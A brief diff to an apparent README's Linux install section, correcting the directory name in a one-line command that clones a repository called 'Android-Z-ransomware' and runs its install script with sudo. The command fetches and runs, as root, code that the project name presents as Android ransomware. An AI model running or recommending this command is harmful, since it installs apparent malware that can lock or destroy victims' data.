@@ -35,7 +35,7 @@ Install my-project Modeuls And Extensions
 ### Installation for linux
 Quick installation for Ubuntu, Kali Linux, Darwin (MAC)
 ```bash
-git clone https://github.com/Alif145/Android-Z-ransomware && cd Z-ransom && sudo bash install.sh
+git clone https://github.com/Alif145/Android-Z-ransomware && cd Android-Z-ransomware  && sudo bash install.sh
 ```
 
 ```bash
